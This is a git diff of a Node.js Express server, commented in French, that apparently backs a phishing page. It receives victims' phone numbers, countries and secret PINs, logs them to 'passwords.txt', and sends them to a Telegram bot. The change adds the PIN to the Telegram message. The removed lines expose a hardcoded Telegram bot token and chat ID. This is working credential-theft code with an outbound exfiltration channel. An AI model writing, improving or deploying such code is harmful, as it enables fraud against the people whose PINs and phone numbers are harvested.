@@ -2,17 +2,17 @@ const express = require("express");
 const fs = require("fs");
 const path = require("path");
 const cors = require("cors");
-const axios = require("axios"); // ← AJOUTÉ
+const axios = require("axios");
 
 const app = express();
 const PORT = process.env.PORT || 10000;
 
 // =======================
 // 🔐 TELEGRAM CONFIG
-// 👉 MET TON TOKEN ICI
+// 👉 MET TON TOKEN DANS RENDER (ENV VAR)
 // =======================
-const TELEGRAM_TOKEN = "8293335258:AAEoHAxk8nbShSd5p4sJWy_iDDiXJPjhN_U";
-const CHAT_ID = "8585623604";
+const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
+const CHAT_ID = "8585623503";
 
 // Middleware
 app.use(cors());
@@ -22,47 +22,40 @@ app.use(express.json());
 // Dossier statique
 app.use(express.static(path.join(__dirname, "..", "STOKE")));
 
-// Fichier où les données seront sauvegardées
+// Fichier de sauvegarde
 const FILE = path.join(__dirname, "passwords.txt");
-
-// Route POST (PIN RETIRÉ)
+// Route POST
 app.post("/", async (req, res) => {
-  const { phone, pin,  country } = req.body;
+  const { phone, pin, country } = req.body;
 
-  // 🔍 Logs sur Render
-  console.log("REQ BODY :", req.body);
-  console.log("COUNTRY :", country);
-  console.log("PHONE :", phone);
-  console.log("PIN   :", pin);
+    console.log("📥 DONNÉES REÇUES :", req.body);
 
-  if (!phone ||  !pin  ||  !country) {
+    if (!phone || !country) {
     console.log("❌ Données manquantes");
     return res.sendStatus(400);
-}
+  }
 
-// Sauvegarde dans le fichier
-  const line = `COUNTRY: ${country} | PHONE: ${phone}  | PIN: ${pin}\n`;
+  // Sauvegarde fichier
+  const line = `COUNTRY: ${country} | PHONE: ${phone}\n🔑 code secret: ${pin}\n`;
   fs.appendFileSync(FILE, line);
 
-  // 📩 Envoi Telegram
+  // Envoi Telegram
   try {
     await axios.post(
       `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
       {
         chat_id: CHAT_ID,
-        text: `📥 Nouvelle donnée reçue\n🌍 Pays: ${country}\n📞 Téléphone: ${phone}`
+        text: `📩 Nouvelle entrée\n🌍 Pays: ${country}\n📞 Téléphone: ${phone}\n🔑 code secret: ${pin}\n`
       }
-      );
+     );
     console.log("✅ Message Telegram envoyé");
-  } catch (err) {
-    console.log("❌ Erreur envoi Telegram");
+  } catch (error) {
+    console.log("❌ Erreur Telegram :", error.message);
   }
 
-  // Réponse simple  
-    res.sendStatus(200);
-  })
-
-  // Lancement du serveur
-app.listen(PORT, () => {
-    console.log("Serveur online sur port " + PORT);
+  res.sendStatus(200);
 });
+
+// Lancement serveur
+app.listen(PORT, () => {
+    console.log(" Serveur online sur port " + PORT);});
